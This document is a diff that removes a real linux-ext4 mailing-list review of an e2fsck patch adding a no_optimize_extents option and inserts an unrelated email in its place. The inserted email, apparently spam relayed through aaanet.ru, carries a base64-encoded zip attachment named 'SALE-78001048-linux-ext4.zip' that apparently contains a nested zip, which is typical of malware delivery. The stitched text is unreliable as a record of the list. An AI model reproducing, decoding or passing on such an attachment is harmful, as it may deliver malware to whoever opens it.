@@ -1,131 +1,54 @@
-From: "Darrick J. Wong" <darrick.wong@oracle.com>
-Subject: Re: [PATCH 3/3] e2fsck: allow extent tree optimization to be disabled
-Date: Sun, 16 Apr 2017 12:24:30 -0700
-Message-ID: <20170416192430.GB5185@birch.djwong.org>
-References: <20170415134118.17808-1-tytso@mit.edu>
- <20170415134118.17808-3-tytso@mit.edu>
+From: <rlm85310@cox.net>
+Subject: (unknown)
+Date: Mon, 17 Apr 2017 02:06:54 -0000
+Message-ID: <149239481412.22388.14526501631350542459@aaanet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Ext4 Developers List <linux-ext4@vger.kernel.org>
-To: "Theodore Ts'o" <tytso@mit.edu>
+Content-Type: application/zip; name="SALE-78001048-linux-ext4.zip"
+Content-Transfer-Encoding: base64
+To: "linux-ext4" <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from aserp1040.oracle.com ([141.146.126.69]:50645 "EHLO
-        aserp1040.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1756597AbdDPTYf (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Sun, 16 Apr 2017 15:24:35 -0400
-Content-Disposition: inline
-In-Reply-To: <20170415134118.17808-3-tytso@mit.edu>
+Received: from p142.mp119.aaanet.ru ([80.80.119.142]:38586 "HELO aaanet.ru"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S932320AbdDQCHA (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Sun, 16 Apr 2017 22:07:00 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-On Sat, Apr 15, 2017 at 09:41:18AM -0400, Theodore Ts'o wrote:
-> Add an extended option, -E no_optimize_extents, as well as a
-> e2fsck.conf profile option, to disable extent tree optimization.
-> 
-> Signed-off-by: Theodore Ts'o <tytso@mit.edu>
-> ---
->  e2fsck/e2fsck.8.in      | 4 ++++
->  e2fsck/e2fsck.conf.5.in | 4 ++++
->  e2fsck/e2fsck.h         | 1 +
->  e2fsck/extents.c        | 3 +++
->  e2fsck/unix.c           | 8 ++++++++
->  5 files changed, 20 insertions(+)
-> 
-> diff --git a/e2fsck/e2fsck.8.in b/e2fsck/e2fsck.8.in
-> index 915273d8..4ad575f4 100644
-> --- a/e2fsck/e2fsck.8.in
-> +++ b/e2fsck/e2fsck.8.in
-> @@ -226,6 +226,10 @@ option may prevent you from further manual data recovery.
->  Do not attempt to discard free blocks and unused inode blocks. This option is
->  exactly the opposite of discard option. This is set as default.
->  .TP
-> +.BI no_optimize_extents
-> +Do not offer to optimize the extent tree by eliminating unnecessary
-> +width or depth.
-> +.TP
->  .BI readahead_kb
->  Use this many KiB of memory to pre-fetch metadata in the hopes of reducing
->  e2fsck runtime.  By default, this is set to the size of two block groups' inode
-> diff --git a/e2fsck/e2fsck.conf.5.in b/e2fsck/e2fsck.conf.5.in
-> index 0bfc76ab..94525baf 100644
-> --- a/e2fsck/e2fsck.conf.5.in
-> +++ b/e2fsck/e2fsck.conf.5.in
-> @@ -205,6 +205,10 @@ of that type are squelched.  This can be useful if the console is slow
->  (i.e., connected to a serial port) and so a large amount of output could
->  end up delaying the boot process for a long time (potentially hours).
->  .TP
-> +.I no_optimize_extents
-> +Do not offer to optimize the extent tree by eliminating unnecessary
-> +width or depth.
-
-Looks ok,
-Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com>
-
-/me wonders if there's a way to detect that we're being run by
-initscripts/systemd/whatever on a device that is mounted ro, and skip
-the optimization step to avoid the reboot.
-
-OTOH I wonder why the initramfs (if available) doesn't just build in
-e2fsck and fsck the root device before mounting the fs...
-
---D
-
-> +.TP
->  .I readahead_mem_pct
->  Use this percentage of memory to try to read in metadata blocks ahead of the
->  main e2fsck thread.  This should reduce run times, depending on the speed of
-> diff --git a/e2fsck/e2fsck.h b/e2fsck/e2fsck.h
-> index ecd3b1e1..a4b5fb24 100644
-> --- a/e2fsck/e2fsck.h
-> +++ b/e2fsck/e2fsck.h
-> @@ -169,6 +169,7 @@ struct resource_track {
->  #define E2F_OPT_DISCARD		0x2000
->  #define E2F_OPT_CONVERT_BMAP	0x4000 /* convert blockmap to extent */
->  #define E2F_OPT_FIXES_ONLY	0x8000 /* skip all optimizations */
-> +#define E2F_OPT_NOOPT_EXTENTS	0x10000 /* don't optimize extents */
->  
->  /*
->   * E2fsck flags
-> diff --git a/e2fsck/extents.c b/e2fsck/extents.c
-> index 1df31d71..d9410028 100644
-> --- a/e2fsck/extents.c
-> +++ b/e2fsck/extents.c
-> @@ -518,6 +518,9 @@ errcode_t e2fsck_should_rebuild_extents(e2fsck_t ctx,
->  	if (eti->force_rebuild)
->  		goto rebuild;
->  
-> +	if (ctx->options & E2F_OPT_NOOPT_EXTENTS)
-> +		return 0;
-> +
->  	extents_per_block = (ctx->fs->blocksize -
->  			     sizeof(struct ext3_extent_header)) /
->  			    sizeof(struct ext3_extent);
-> diff --git a/e2fsck/unix.c b/e2fsck/unix.c
-> index b7322bc6..b6025535 100644
-> --- a/e2fsck/unix.c
-> +++ b/e2fsck/unix.c
-> @@ -709,6 +709,9 @@ static void parse_extended_opts(e2fsck_t ctx, const char *opts)
->  		} else if (strcmp(token, "nodiscard") == 0) {
->  			ctx->options &= ~E2F_OPT_DISCARD;
->  			continue;
-> +		} else if (strcmp(token, "no_optimize_extents") == 0) {
-> +			ctx->options |= E2F_OPT_NOOPT_EXTENTS;
-> +			continue;
->  		} else if (strcmp(token, "log_filename") == 0) {
->  			if (!arg)
->  				extended_usage++;
-> @@ -1007,6 +1010,11 @@ static errcode_t PRS(int argc, char *argv[], e2fsck_t *ret_ctx)
->  	if (c)
->  		verbose = 1;
->  
-> +	profile_get_boolean(ctx->profile, "options", "no_optimize_extents",
-> +			    0, 0, &c);
-> +	if (c)
-> +		ctx->options |= E2F_OPT_NOOPT_EXTENTS;
-> +
->  	if (ctx->readahead_kb == ~0ULL) {
->  		profile_get_integer(ctx->profile, "options",
->  				    "readahead_mem_pct", 0, -1, &c);
-> -- 
-> 2.11.0.rc0.7.gbe5a750
-> 
+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
